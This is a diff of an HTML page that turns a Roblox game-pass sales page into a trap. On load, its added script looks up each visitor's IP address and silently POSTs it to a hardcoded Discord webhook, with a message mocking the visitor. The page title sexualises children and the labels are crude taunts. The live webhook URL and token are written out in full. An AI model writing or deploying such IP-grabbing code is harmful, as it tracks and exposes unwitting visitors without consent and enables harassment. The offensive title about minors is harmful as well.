@@ -1,56 +1,75 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Image and Buttons</title>
+  <title>sexy kids</title>
   <style>
     body {
       background-color: black;
+      color: white;
+      font-family: "Comic Sans MS", sans-serif;
       display: flex;
       flex-direction: column;
-      align-items: center;
       justify-content: center;
+      align-items: center;
       height: 100vh;
       margin: 0;
-      color: white;
     }
-    img {
-      margin-top: 20px; /* Adjust the margin as desired */
-    }
-    .button-container {
-      display: flex;
-      justify-content: center;
-      margin-top: 20px; /* Adjust the margin as desired */
-    }
-    .button {
-      background-color: #299937;
-      color: white;
-      padding: 15px 30px; /* Adjust the padding as desired */
-      font-size: 16px;
-      border-radius: 8px; /* Adjust the border-radius as desired */
-      border: none;
-      margin: 0 10px; /* Adjust the margin as desired */
-      text-decoration: none;
-      display: inline-block;
+    .ip-container {
       text-align: center;
-      cursor: pointer;
     }
-    .disclaimer {
-      margin-top: 10px; /* Adjust the margin as desired */
-      font-size: 18px; /* Adjust the font size as desired */
-      font-family: "Cosmic Sans", sans-serif; /* Add the Cosmic Sans font */
-      color: red;
+    .ip-label {
+      font-size: 48px; /* Increased font size for the label */
+      margin-bottom: 10px;
+    }
+    .ip-address {
+      font-size: 36px; /* Increased font size for the IP address */
+      line-height: 1;
     }
   </style>
-  <link href="https://fonts.googleapis.com/css2?family=Cosmic+Sans&display=swap" rel="stylesheet">
+  <script>
+    // JavaScript to fetch and display the user's IP address
+    document.addEventListener('DOMContentLoaded', function () {
+      const ipAddressElement = document.getElementById('ipAddress');
+
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+          ipAddressElement.innerText = `loadgaysexscript : ${ipAddress}`;
+          sendToDiscordWebhook(ipAddress);
+        })
+        .catch(error => {
+          ipAddressElement.innerText = "Unable to retrieve IP address.";
+        });
+    });
+
+    // JavaScript to send the IP address to the Discord webhook
+    function sendToDiscordWebhook(ipAddress) {
+      const webhookURL = "https://discord.com/api/webhooks/1142963647543509104/RGhXfoi_BLVaPdH852cA4PT7n06sexBRpFyUY8c37VBos1eWzLZAxZXiP2FBNy4INUcx";
+      const data = {
+        content: `ou mai gad blud checked the source of the script :skulo:  ${ipAddress}`
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => {
+        console.log("IP address sent to Discord webhook successfully!");
+      })
+      .catch(error => {
+        console.error("Error sending IP address to Discord webhook:", error);
+      });
+    }
+  </script>
 </head>
 <body>
-  <img src="https://cdn.discordapp.com/attachments/1115317282567102627/1116175886107025518/image.png" alt="Image">
-  
-  <div class="button-container">
-    <a href="https://www.roblox.com/game-pass/186832372/DM-To-Prove" class="button">Buy Here</a>
-    <a href="https://discord.gg/example" class="button">Discord Server</a>
+  <div class="ip-container">
+    <div class="ip-label">n u h    u h</div>
+    <div class="ip-address" id="ipAddress"></div>
   </div>
-  
-  <p class="disclaimer">*The Server Is In Development! Please Send Proof To m3wt#6876 After Purchasing.*</p>
 </body>
 </html>
